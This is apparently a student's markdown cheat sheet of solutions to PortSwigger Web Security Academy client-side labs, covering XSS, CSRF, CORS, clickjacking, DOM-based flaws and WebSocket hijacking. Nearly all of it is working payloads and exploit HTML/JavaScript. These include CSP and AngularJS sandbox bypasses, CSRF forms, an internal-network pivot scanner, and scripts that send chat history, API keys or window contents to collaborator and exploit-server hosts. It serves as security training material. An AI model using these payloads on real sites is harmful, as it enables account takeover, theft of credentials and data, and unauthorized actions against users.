Client-side summary
---
Ayooo, lucky me!

Author: Punthat Siriwan

---
**TOPICS**
- [XSS](#xss)
- [CSRF](#csrf)
- [CORS](#cors)
- [Clickjacking](#clickjacking)
- [Dom Vuln](#dom-vuln)
- [Web Socket](#web-socket)

----
----
# XSS

**Reflected XSS nothing encoded**

`<script>alert('hello')<script>`

---
**Stored XSS nothing encoded**  

    comment in any post
`<script>alert(1)</script>`

---

**DOM XSS in document.write** - source location.search

    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
`"><script>alert(1)</script>`

---

**DOM XSS in innerHTML** - source location.search

    function doSearchQuery(query)
`<img src=1 onerror=alert(1)>`

---

**DOM XSS in JQuery anchor** - source location.search

    contain feedback function
    id="backLink" href="/"

`/feedback?returnPath=javascript:alert(document.cookie)`

---

**DOM XSS in JQuery selector** - hashchange event

    $()
    Exploit server
`<iframe src="https://0a0d005404f104ea8166cf5b00ee0014.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

---

**Reflecd XSS - angle brackets HTML-encoded**
    
    search
`"onmouseover="alert(1)`

---

**Stored XSS anchor href - double qoutes HTML encoded**
    
    post
    vuln in website input
`javascript:alert(document.domain)`
`javascript:alert(1)`

---

**Reflect XSS into JS - angle brackets HTML encoded**

    var searchTerms ... ; document.write(<img src= ....... + encodeURIComponent(searchTerms)+'">');
`'-alert(1)-'`

---

**DOM XSS in document.write** - location.search inside a select element

    var stores = ["Lon...]; var store = (new URLSearchParams(window.location.search).get('storeID'); document.write....)
    ...
    document.write('</select>');
`product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>`

---

**DOM XSS in Angular JS** - angle brackets and double quotes HTML-encoded

    <body ng-app>
    search
`{{$on.constructor('alert(1)')()}}`

---

**Reflected DOM XSS**

    searchResult.js
    |- eval('var SearchResultsObj..)
`\"-alert(1)}//`

---

**Stored DOM XSS**
    
    in a blog post
    |- loadCommentsWithVulnerableEscapeHtml.js
`<><img src=1 onerror=alert(1)>`

---

**Reflected XSS into HTML context** - most tags and attributes blocked
    
    search
    <img src=1 onerror=print()> => Tag is not allowed
1. burp intruder > GET /?search=<$$> 
2. visit XSS cheat sheet and copy tags to clipboard
3. attack find the result, copy events to clipboard
4. <body $$=1>, see result. the attack should be similar to this
`<iframe src="https://0ad200d0041a3a3e84b568fa009800e3.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

---

**Reflected XSS into HTML context** - all tags blocked except custom
    
    <img src=1 onerror=print()> => Tag is not allowed
    document.cookie
    exploit server
1. same method as above

``` html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
---

**Reflected XSS** - SVG markup allowed

`/?search="><svg><animatetransform onbegin=alert(1)>`
`<svg><animatetransform onbegin=alert(1)>`

---

**Reflected XSS** - canonical link tag
    ALT+SHIFT+X
```
'accesskey='x'onclick='alert(1)
%27accesskey=%27x%27onclick=%27alert(1)
```

---

**Reflected XSS in to JS string** - single quote and backslash escaped
    
    var searchTerms = '...';
    document.write('<img src =/....' + encodeURIComponent(searchTerms)+'">')
    SOMETHING&apos;'
```html
</script><script>alert(1)</script>
‘</script><script>alert(1)</script>
```

---

**Reflected XSS into JS string** - angle brackets and double quotes HTML-encoded and single quotes escaped
   
    var searchTerms = '...';
    document.write('<img src =/....' + encodeURIComponent(searchTerms)+'">')
    TEST'PAYLOAD - TEST\PAYLOAD 
`\'-alert(1)//`

---

**Stored XSS into onclick event** - angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

    onclick event
    vuln in website input
```URL
https://foo/?%27-alert(1)-%27
https://foo/?%’-alert(1)-’
```

---

**Reflected XSS into a template literal** with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

    var message = `0 search results for 'SOMETHING'/<>SOMETHING`
    |- var message = `0 search results for 'SOMETHING\u0027/\u003...SOMETHING`
`${alert(1)}`

---

**Exploiting XSS to perform CSRF**

    change email
    blog comment
    comment function vuln
```html
<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
```

---

**Reflected XSS with AngularJS sandbox escape without strings** !EX

    angular.module('labApp'. []).controllwe('vulnCrtl'),... $scope.value=$parse(key)...
`1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`

---

**Reflected XSS with AngularJS sandbox escape and CSP** !EX
    
    exploit server
    ng-focus
    $event

```html
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

---

**Reflected XSS with event handlers and href attributes blocked** !EX

    search
    href blocked
    Click me
`https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E`

`<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>`

---

**Reflected XSS in a JavaScript URL with some characters blocked** !EX

    blog post
    <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5'}).finally(_ => window.location = '/')">Back to Blog</a>

`https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`

---

**Reflected XSS protected by very strict CSP, with dangling markup attack** !EX

    click me
    change email -> strict CSP in a response
```html
<script>
if(window.name) {
 new Image().src='//lazvciinven3x04ap394ctkik9q1es2h.oastify.com?'+encodeURIComponent(window.name);
 } else {
  location = 'https://0abd00440376d3fa80868a420018008d.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a9a00dd0367d38e80af896001ec00df.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```
---

**Reflected XSS protected by CSP, with CSP bypass** !EX

    CSP
    Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
    search
`%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27`
`<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'`

---
---

# CSRF
actually all labs with CSRF exploit objectives are "change email of the victim, login as someone" and included exploit server

**CSRF vulnerability with no defenses**

    CSRF PoC Generator in Burp Sutie
```html
<form action="https://0abb00e2038e5b2c8013305500ed00f7.web-security-academy.net
/my-account/change-email" method="POST">
  	<input type="hidden" name="email" value="hacked2222@mail" />
	</form>
	<script>
  	document.forms[0].submit()
	</script>
```
---

**CSRF where token validation depends on request method**
    
    can't use used csrf token
1. remove csrf params token from body
2. change method from POST to GET
3. generate PoC
```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
	<input type="hidden" name="email" value="anything@web-security-academy.net">
</form>
<script>
    	document.forms[0].submit();
</script>
```
---

**CSRF where token validation depends on token being present**

1. remove csrf params token
2. generate PoC
```html
<html>
  <body>
	<form action="https://0a4e00630414272080d535cd004900bc.web-security-academy.net
/my-account/change-email" method="POST">
  	<input type="hidden" name="email" value="HACKED@MAIL" />
	</form>
	<script>
  	document.forms[0].submit()
	</script>
  </body>
</html>
```
---

**CSRF where token is not tied to user session**
1. intercept csrf token
2. generate POC
3. replace with the csrf token
```html
<input type="hidden" name="csrf" value="kSb4MmYwwB5PR3QFLS5Ejt74NgWIXNjD" />
```
---

**CSRF where token is tied to non-session cookie**

    csrfKey=asdfasfasdfasdf
1. swap CSRFtoken and CSRFkey
```html
<form action="https://0a4200c90364b0738238ab5e00550002.web-security-academy.net/my-account/change-email" method="POST">
  	<input type="hidden" name="email" value=”hacked@mail" />
  	<input type="hidden" name="csrf" value="UpLJh87kpwbqUqvE4tGVjSScFgyJiPoj" />
	</form>
	<script>
  	<img src="https://0a4200c90364b0738238ab5e00550002.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=QBI13zb7V7C3i4ZK3OmawrhrtgZ4KdmK%3b%20SameSite=None" onerror="document.forms[0].submit()">
</script>
```
---

**CSRF where token is duplicated in cookie**
    
    csrf Cookie == csrf token body
1. `/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`
```html
<form action="https://0abe00200355e06180276ccd00c70056.web-security-academy.net/my-account/change-email" method="POST">
  	<input type="hidden" name="email" value="hackedasfadssdafd@ggq" />
  	<input type="hidden" name="csrf" value="fake" />
	</form
	<script>
  	<img src="https://0abe00200355e06180276ccd00c70056.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
</script>
```
---

**SameSite Lax bypass via method override**

    no csrf in body
1. change method from POST to GET
2. add &_method=POST in query param (change-email?email=test...&_meth...)
3. generate PoC
```html
<script>
	document.location = "https://0ad5003304d77b118000ccb200cb0052.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```
---

**SameSite Strict bypass via client-side redirect**

    change-email contain submit=1 in body param
    login => Set-Cookie; SameSite=Strict
    post comment
    commentConfirmationRedirect.js
```html
<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account"; </script>

<script>
	document.location = "https://0aed002104d7191e80ec30c0007d00ed.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacked@ja%26submit=1";
</script>
```
---

**SameSite Strict bypass via sibling domain**

    CSWSH - Web Socket
    Chat history - Chat
    login credentials in plain text
    try cms-LAB_URL
```html
<script>
    var ws = new WebSocket('wss://0a7d0053034c26f380cf3b4a00240084.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://wmm4ofqyaazbwvqbv77vu4k0zr5it8hx.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
1. modified the payload
2. URL encode entire script
3. go to exploit server with 
```html
<script>
    document.location = "https://cms-0a7d0053034c26f380cf3b4a00240084.web-security-academy.net/login?username=$ENCODED_STRING_FROM_NUMBER2$&password=anything";
</script>
```
4. wait for collab
   
---

**SameSite Lax bypass via cookie refresh**

    OAuth-baed login
    cookie refresh
```html
<form method="POST" action="https://0a9e00c804d3f51e82608ec0009c0078.web-security-academy.net/my-account/change-email">
	<input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
	window.onclick = () => {
    	window.open('https://0a9e00c804d3f51e82608ec0009c0078.web-security-academy.net/social-login');
    	setTimeout(changeEmail, 5000);
	}

	function changeEmail() {
    	document.forms[0].submit();
	}
</script>
```
---

**CSRF where Referer validation depends on header being present**

    Adjust Referer header => Invalid referer header
1. delete referer header
```html
<meta name="referrer" content="no-referrer">
<form action="https://0a4f00a303d933a4829006df001f0065.web-security-academy.net
/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="hacked2222@mail" />
</form>
<script>
      document.forms[0].submit()
</script>
```
---

**CSRF with broken Referer validation**

    Adjust Referer header => Invalid referer header
1. add `Referrer-Policy: unsafe-url` in exploit sever's head
```html
<script>
history.pushState("", "", "/?https://0a5c004703feb3af80092b4f00f000cc.web-security-academy.net")
</script>
<form action="https://0a5c004703feb3af80092b4f00f000cc.web-security-academy.net
/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@mail" />
</form>
<script>
  	document.forms[0].submit()
</script>
```
---
---

# CORS

**CORS vulnerability with basic origin reflection**
    
    API key in my-account
    GET /accountDetails => Access-Control-Allow-Credentials: true
1. add Origin to request e.g. `Origin: https://example.com`
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
2. send the exploit and go to access log

---

**CORS vulnerability with trusted null origin**

    API key in my-account
    GET /accountDetails => Access-Control-Allow-Credentials: true
1. add null Origin to request e.g. `Origin: null`
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
2. send and go to access log

---

**CORS vulnerability with trusted insecure protocols**

    API key in my-account
    GET /accountDetails => Access-Control-Allow-Credentials: true
    stock.LAB_URL in product detail page
1. add subdomian Origin to request e.g. `Origin: https://SUBDOMIAN.LAB_URL`
```html
<script>
    document.location="http://stock.0ab4000c04fef8f780932617002c009a.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ab4000c04fef8f780932617002c009a.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a4200ae046af845806725dd015e0022.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
2. modified payload

---

**CORS vulnerability with internal network pivot attack** !EX

    delete carlos
1. send this exploit below
```html
<script>
var q = [], collaboratorURL = 'http://$collaboratorPayload';

for(i=1;i<=255;i++) {
	q.push(function(url) {
		return function(wait) {
			fetchUrl(url, wait);
		}
	}('http://192.168.0.'+i+':8080'));
}

for(i=1;i<=20;i++){
	if(q.length)q.shift()(i*100);
}

function fetchUrl(url, wait) {
	var controller = new AbortController(), signal = controller.signal;
	fetch(url, {signal}).then(r => r.text().then(text => {
		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
	}))
	.catch(e => {
		if(q.length) {
			q.shift()(wait);
		}
	});
	setTimeout(x => {
		controller.abort();
		if(q.length) {
			q.shift()(wait);
		}
	}, wait);
}
</script>
```
2. clear the code from step1. replace $ip with the IP address and port from collab
```html
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r => r.text().then(text => {
		xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
	}))
}

fetchUrl("http://192.168.0.197:8080", "http://aftoe7jcrthzecao2tmlo067iyoscj08.oastify.com");
</script>
```
3. clear the code from step2. replace $ip with the same the IP address and port from collab
```html
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r=>r.text().then(text=>
	{
		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
	}
	))
}

fetchUrl("http://192.168.0.197:8080", "http://aftoe7jcrthzecao2tmlo067iyoscj08.oastify.com");
</script>
```
4. clear the code from step3. replace $ip with the same the IP address and port from collab
```html
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
	fetch(url).then(r=>r.text().then(text=>
	{
	xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
	}
	))
}

fetchUrl("http://192.168.0.197:8080");
</script>
```

----
----

# Clickjacking

**Basic clickjacking with CSRF token protection**

    click on a decoy website
    exploit server
    CSRF - delete account
```html
<style>
	iframe {
    	position:relative;
    	width: 1200px;
    	height: 992px;
    	opacity: 0.1;
    	z-index: 2;
	}
	div {
    	position:absolute;
    	top: 575px;
    	left: 60px;
    	z-index: 1;
	}
</style>
<div>Test me</div>
<iframe src="https://0a2800ae0392be2e80ef308a008d0012.web-security-academy.net/my-account"></iframe>
```
---

**Clickjacking with form input data prefilled from a URL parameter**

    click on a decoy website
    exploit server
    CSRF - update email
```html
<style>
    iframe {
   	 position:relative;
   	 width: 1200px;
   	 height: 992px;
   	 opacity: 0.0001;
   	 z-index: 2;
    }
    div {
   	 position:absolute;
   	 top: 490px;
   	 left: 80px;
   	 z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a5300f603a5beef80996c4f0085008a.web-security-academy.net/my-account?email=pwned@makk3.com"></iframe>
```
---

**Clickjacking with a frame buster script**

    click on a decoy website
    exploit server
    CSRF - update email
    framebuster
```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```
---
**Exploiting clickjacking vulnerability to trigger DOM-based XSS**

    click on a decoy website
    exploit server
    call print()
    DOM XSS
```html
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```
---

**Multistep clickjacking**
    
    delete account -> make sure yes
```html
<style>
    iframe {
   	 position:relative;
   	 width:500px;
   	 height: 700px;
   	 opacity: 0.0001;
   	 z-index: 2;
    }
   .firstClick, .secondClick {
   	 position:absolute;
   	 top:500px;
   	 left:75px;
   	 z-index: 1;
    }
   .secondClick {
   	 top:285px;
   	 left:225px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0ac500e1035994f480a64e93006e00b7.web-security-academy.net/my-account"></iframe>
```
----
----

# Dom Vuln

**DOM XSS using web messages**
    
    print()
    window.addEventListener('message', function(e){...
        document.getElementById('ads').innerHTML=e.data;
    })
```html
<iframe src="https://0a8500e904e7f8c88088a39700fb0065.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
---

**DOM XSS using web messages and a JavaScript URL**
    
    print()
    window.addEventListener('message', function(e){...
        var url = e.data;
        if (url.indexOf('http:') > -1) || url ...
        location.href = url;
    })
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
---

**DOM XSS using web messages and JSON.parse**
    
    print()
    window.addEventListener('message', function(e){...
        var iframe = document.createElement('iframe', ACME player ={
            element: iframe .......
        catch(e){..}
        switch(d.type){
            case "page-load", .. "load-channel", .. "player-height-changed"
        }
```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'> 
```
---

**DOM-based open redirection**
    
    redirect victim to exploit server
    blog post contain
    |- <a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```URL
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
```

---

**DOM-based cookie manipulation**

    print()
    cookie and Last viewed product function
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```

---

**Exploiting DOM clobbering to enable XSS** !EX
    
    alert()
    <script>loadComments('/post/comment')
    /resources/js/loadCommentsWithDomClobbering.js
    loadCommentsWithDomPurify.js
1. comment on a blog post with a text below
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
2. make a second post

---

**Clobbering DOM attributes to bypass HTML filters** !EX

    print()
    <script>loadComments('/post/comment')
    /resources/js/loadCommentsWithHtmlJanitor.js
    /resources/js/htmlJanitor.js
1. comment on any post with a text below
```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```
2. exploit server and modified the postId matches (1.), then send
```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```
3. relaod a page

----
----

# Web Socket

**Manipulating WebSocket messages to exploit vulnerabilities**

    alert()
    Live chat
1. intercept webSockets message
`<img src=1 onerror=alert(1)>`
`<img src=1 onerror='alert(1)'>`

---

**Cross-site WebSocket hijacking**

    CSWHS
    Live chat
    exploit server
```html
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
---

**Manipulating the WebSocket handshake to exploit vulnerabilities**

    alert()
    Live chat
    XSS, X-Forwarded-For
    "error":"Attack detected: Event handler"
1. send a basic XSS e.g. `img src=1 onerror='alert(1)'>`
2. try reconnect
3. add `X-Forwarded-For: 1.1.1.1` to a header # to bypass IP-based restrictions
4. send a message ```<img src=1 oNeRrOr=alert`1`>```

---
----
----
Goodluck, my G

[def]: #client-side-summary